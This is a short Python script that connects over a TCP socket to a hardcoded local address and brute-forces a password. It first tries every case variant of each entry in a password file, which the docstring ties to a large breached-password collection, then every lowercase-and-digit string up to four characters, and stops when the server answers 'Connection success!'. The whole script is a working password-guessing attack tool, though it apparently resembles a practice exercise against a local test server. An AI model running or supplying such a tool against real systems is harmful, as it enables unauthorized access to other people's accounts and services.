import sys
import socket
import itertools
import string

"""
Args: Host, port
Password list: https://www.troyhunt.com/the-773-million-record-collection-1-data-reach/
"""

socket_1 = socket.socket()
# address = (sys.argv[1], int(sys.argv[2]))
address = ("192.168.0.102", 9090)

alphabet = list(string.ascii_lowercase)
nums = list(string.digits)
all_char = list(itertools.chain(nums, alphabet))

socket_1.connect(address)
with open("passwords.txt", 'r') as f:
    pass_list = f.read().splitlines()


while True:
    # password list first
    for _ in pass_list:
        up_lo = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in _)))
        for a in up_lo:
            socket_1.send(a.encode())
            response = socket_1.recv(1024)
            if response.decode() == "Connection success!":
                print("Pass word was hacked:", _)
                break
        if response.decode() == "Connection success!":
            break
    if response.decode() == "Connection success!":
            break
    
    # generator 
    for _ in range(1, 5):
        prods = itertools.product(all_char, repeat=_)

        while True:
            try:
                a = next(prods)
            except StopIteration:
                break
            else:
                a = "".join(a)
                socket_1.send(a.encode())
                response = socket_1.recv(1024)
                if response.decode() == "Connection success!":
                    print("Password was hacked:", a)
                    break
        
    break


socket_1.close()